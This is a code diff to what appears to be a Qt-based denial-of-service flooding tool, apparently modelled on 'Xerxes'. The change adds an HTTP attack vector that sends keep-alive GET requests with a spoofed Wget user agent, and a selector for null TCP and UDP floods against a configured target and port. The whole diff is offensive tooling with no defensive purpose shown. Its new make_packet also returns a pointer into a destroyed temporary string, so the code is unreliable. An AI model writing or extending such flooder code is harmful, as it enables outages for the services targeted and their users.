@@ -48,8 +48,16 @@ int Attack::write_socket(QAbstractSocket *sock){
     return sock->write(packet.toUtf8());
 }
 
-QString Attack::make_packet(){
-    return QString::fromLocal8Bit("\0");
+const char *Attack::make_packet(){
+    QString packet{};
+    switch(vector){
+    case HTTP:
+        packet = "GET / HTTP/1.0\r\nUser-Agent: Wget/1.16 (Xerxes The Great)\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n";
+        break;
+    default:
+        packet = QString::fromLocal8Bit("\0");
+    }
+    return packet.toStdString().c_str();
 }
 
 void Attack::dos() {
@@ -106,7 +114,7 @@ void Attack::on_pushButton_clicked()
     stop();
 }
 
-void Attack::set_config(QString t, QString p, int trds, int con){
+void Attack::set_config(QString t, QString p, int trds, int con, Vector vec){
     target = t;
     port = p;
     threads = trds;
@@ -116,6 +124,21 @@ void Attack::set_config(QString t, QString p, int trds, int con){
     ui->label_8->setText(QString::number(threads));
     ui->label_9->setText(QString::number(connections));
     ui->label_10->setText(QString::number(voly));
+    switch (vec) {
+    case HTTP:
+        ui->label_13->setText("HTTP");
+        protocol = TCP;
+        break;
+    case NullTCP:
+        ui->label_13->setText("NULLTCP");
+        protocol = TCP;
+        break;
+    case NullUDP:
+        ui->label_13->setText("NULLUDP");
+        protocol = UDP;
+        break;
+    default:break;
+    }
 }
 
 void Attack::update_gui(){
